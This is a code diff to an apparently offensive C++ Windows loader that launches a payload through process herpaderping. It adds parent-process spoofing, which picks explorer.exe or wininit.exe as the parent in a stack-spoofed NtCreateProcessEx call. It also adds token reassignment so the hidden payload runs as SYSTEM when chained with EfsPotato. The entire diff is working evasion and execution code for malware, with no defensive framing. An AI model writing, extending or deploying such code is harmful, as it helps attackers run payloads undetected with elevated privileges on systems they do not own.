@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include <stdio.h>
+#include <tlhelp32.h>
 #include "CWLInc.h"
 #include "StackSpoof.h"
 
@@ -8,6 +9,26 @@
 #ifndef PAYLOAD_PATH
 #define PAYLOAD_PATH L"C:\\temp\\payload64.exe"
 #endif
+
+static HANDLE GetNonJobParent()
+{
+	const wchar_t* targets[] = { L"explorer.exe", L"wininit.exe", NULL };
+	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();
+	PROCESSENTRY32W pe = { sizeof(pe) };
+	if (Process32FirstW(hSnap, &pe)) {
+		do {
+			for (int i = 0; targets[i]; i++) {
+				if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
+					HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
+					if (h) { CloseHandle(hSnap); return h; }
+				}
+			}
+		} while (Process32NextW(hSnap, &pe));
+	}
+	CloseHandle(hSnap);
+	return GetCurrentProcess();
+}
 
 BYTE *GetPayloadBuffer(OUT size_t &p_size)
 {
@@ -164,16 +185,40 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 	}
 
 	// Create Process with section (SPOOFED CALL)
+	HANDLE hParent = GetNonJobParent();
 	{
 		StackSpoofer spoofer("kernel32.dll");
 		spoofer.Activate();
-		status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(),
-									PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
+		status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, hParent,
+									0, hSection, NULL, NULL, FALSE);
 		spoofer.Deactivate();
 	}
+	if (hParent != GetCurrentProcess()) CloseHandle(hParent);
 	if (!NT_SUCCESS(status))
 	{
 		exit(-1);
+	}
+
+	// Token fixup: NtCreateProcessEx inherits token from parent (explorer.exe),
+	// reassign the calling process token so ghost runs with our identity (SYSTEM if via EfsPotato)
+	{
+		_NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(
+			GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
+		if (pNtSetInformationProcess)
+		{
+			HANDLE hToken = NULL;
+			if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken))
+			{
+				HANDLE hPrimary = NULL;
+				if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &hPrimary))
+				{
+					PROCESS_ACCESS_TOKEN pat = { hPrimary, NULL };
+					pNtSetInformationProcess(hProcess, (PROCESSINFOCLASS)9, &pat, sizeof(pat));
+					CloseHandle(hPrimary);
+				}
+				CloseHandle(hToken);
+			}
+		}
 	}
 
 	// Get remote process information
